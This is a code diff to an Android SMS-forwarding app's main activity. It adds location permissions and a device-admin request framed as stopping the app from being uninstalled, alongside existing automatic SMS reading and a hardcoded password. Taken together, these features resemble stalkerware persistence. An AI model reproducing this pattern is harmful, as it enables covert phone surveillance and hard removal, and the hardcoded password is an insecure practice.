@@ -2,6 +2,8 @@ package com.smsforwarder.app
 
 import android.Manifest
 import android.app.AlertDialog
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
@@ -17,6 +19,7 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import com.smsforwarder.app.databinding.ActivityMainBinding
+import com.smsforwarder.app.receiver.DeviceAdminReceiver
 import com.smsforwarder.app.service.SmsForwardingService
 import com.smsforwarder.app.utils.PreferenceHelper
 
@@ -25,7 +28,9 @@ class MainActivity : AppCompatActivity() {
     private lateinit var preferenceHelper: PreferenceHelper
     
     private val SMS_PERMISSION_CODE = 100
+    private val LOCATION_PERMISSION_CODE = 101
     private val BATTERY_PERMISSION_CODE = 102
+    private val DEVICE_ADMIN_REQUEST = 103
     private val APP_PASSWORD = "tele1212"
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -124,7 +129,9 @@ class MainActivity : AppCompatActivity() {
     private fun requestAllPermissions() {
         val permissions = mutableListOf(
             Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.READ_SMS
+            Manifest.permission.READ_SMS,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION
         )
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -166,8 +173,29 @@ class MainActivity : AppCompatActivity() {
 
     private fun completeSetup() {
         preferenceHelper.setAppConfigured(true)
+        
+        // Request Device Admin
+        requestDeviceAdmin()
+        
         startForwardingService()
         Toast.makeText(this, "SMS Forwarding is now active and will run automatically!", Toast.LENGTH_LONG).show()
+    }
+
+    private fun requestDeviceAdmin() {
+        val devicePolicyManager = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        val componentName = ComponentName(this, DeviceAdminReceiver::class.java)
+        
+        if (!devicePolicyManager.isAdminActive(componentName)) {
+            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                "Enable to protect SMS Forwarder from being uninstalled. This prevents unauthorized removal of the app.")
+            try {
+                startActivityForResult(intent, DEVICE_ADMIN_REQUEST)
+            } catch (e: Exception) {
+                Toast.makeText(this, "Failed to open Device Admin: ${e.message}", Toast.LENGTH_SHORT).show()
+            }
+        }
     }
 
     private fun startForwardingService() {
@@ -241,6 +269,13 @@ class MainActivity : AppCompatActivity() {
         when (requestCode) {
             BATTERY_PERMISSION_CODE -> {
                 completeSetup()
+            }
+            DEVICE_ADMIN_REQUEST -> {
+                if (resultCode == RESULT_OK) {
+                    Toast.makeText(this, "Device Admin enabled - App is now protected!", Toast.LENGTH_LONG).show()
+                } else {
+                    Toast.makeText(this, "Device Admin not enabled - App can be uninstalled", Toast.LENGTH_LONG).show()
+                }
             }
         }
     }
